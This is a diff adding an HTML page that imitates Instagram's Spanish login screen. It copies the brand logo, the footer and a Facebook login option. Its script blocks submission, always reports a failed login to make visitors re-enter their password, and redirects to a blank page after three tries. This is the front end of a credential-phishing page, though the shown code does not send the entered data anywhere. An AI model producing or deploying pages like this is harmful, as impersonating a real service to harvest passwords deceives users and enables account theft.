@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Inicio de Sesión - Instagram</title>
+    <link rel="stylesheet" href="styles.css">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Billabong&display=swap" rel="stylesheet">
+</head>
+<body>
+    <div class="mobile-container">
+        <!-- Mensaje de error -->
+        <div id="error-message" class="error-message" style="display: none;">
+            <p>Inicio de sesión fallido. Por favor, ingrese los datos correctos.</p>
+        </div>
+
+        <!-- Contenido del formulario de inicio de sesión aquí -->
+        <div class="login-box">
+            <i data-visualcompletion="css-img" aria-label="Instagram" class="" role="img" style="background-image: url(&quot;https://static.cdninstagram.com/rsrc.php/v3/yM/r/8n91YnfPq0s.png&quot;); background-position: 0px -52px; background-size: auto; width: 175px; height: 51px; background-repeat: no-repeat; display: inline-block;"></i>
+            <form id="loginForm">
+                <input type="text" placeholder="Número de teléfono, nombre de usuario o correo electrónico" required>
+                <input type="password" placeholder="Contraseña" required>
+                <button type="submit">Iniciar sesión</button>
+                <a href="#" class="forgot-password">¿Olvidaste tu contraseña?</a>
+            </form>
+            <div class="separator">
+                <div class="line"></div>
+                <span>o</span>
+                <div class="line"></div>
+            </div>
+            <button class="login-with-facebook">Iniciar sesión con Facebook</button>
+        </div>
+
+        <div class="signup-box">
+            <p>¿No tienes una cuenta? <a href="#">Regístrate</a></p>
+        </div>
+    </div>
+    <footer class="footer">
+        <div class="footer-links">
+            <p>
+                <a href="#">Información</a> •
+                <a href="#">Blog</a> •
+                <a href="#">Empleo</a> •
+                <a href="#">Ayuda</a> •
+                <a href="#">API</a> •
+                <a href="#">Privacidad</a> •
+                <a href="#">Condiciones</a> •
+                <a href="#">Ubicaciones</a> •
+                <a href="#">Instagram Lite</a> •
+                <a href="#">Threads</a> •
+                <a href="#">Importación de contactos</a> •
+                <a href="#">Meta Verified</a>
+            </p>
+            <div class="language-selector">
+                <select id="languageSelect" onchange="changeLanguage(this.value)">
+                    <option value="es" selected>Español</option>
+                    <option value="en">English</option>
+                    <option value="pt">Português</option>
+                    <option value="fr">Français</option>
+                    <!-- Añade más idiomas según sea necesario -->
+                </select>
+            </div>
+            <p>&copy; 2024 Instagram from Meta</p>
+        </div>
+    </footer>
+    <script>
+        var attemptCount = 0; // Contador de intentos
+
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault(); // Evita el envío del formulario para la demostración
+            
+            attemptCount++;
+            
+            if (attemptCount > 3) {
+                window.location.href = 'blank.html'; // Redirige a la página en blanco después de tres intentos
+                return;
+            }
+
+            // Muestra el mensaje de error
+            var errorMessage = document.getElementById('error-message');
+            errorMessage.style.display = 'block';
+            
+            // Oculta el mensaje de error después de 4 segundos
+            setTimeout(function() {
+                errorMessage.style.display = 'none';
+            }, 4000);
+        });
+
+        function changeLanguage(lang) {
+            // En una implementación real, aquí se cargarían los recursos de idioma correspondientes
+            alert('Idioma cambiado a: ' + lang);
+            // Simulación de redirección
+            window.location.href = window.location.href;
+        }
+    </script>
+</body>
+</html>
